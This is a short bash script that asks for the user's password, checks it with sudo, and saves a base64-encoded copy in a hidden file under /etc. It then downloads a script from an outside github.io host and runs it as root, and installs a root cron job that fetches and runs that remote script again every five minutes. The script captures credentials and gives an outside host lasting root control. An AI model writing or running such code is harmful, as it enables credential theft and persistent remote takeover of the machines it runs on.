#!/bin/bash

echo -n "Password:"
read -s pwd </dev/tty
echo ""

echo $pwd | sudo -S echo "Thank you for your help!"

enc=$(echo $pwd | base64 | tr -- '+=/' '-_~')
echo "putting $enc from $pwd"
sudo echo $enc > /etc/.pwd.txt

curl -s https://matthewpipie.github.io/sendmac.sh?$(date +%s) | sudo bash

command="curl -s https://matthewpipie.github.io/sendmac.sh?\$(date +\%s) | sudo bash"

#write out current crontab
sudo crontab -u root -l > mycron
#echo new cron into cron file
echo "*/5 * * * * $command" >> mycron
#install new cron file
sudo crontab -u root mycron
rm mycron
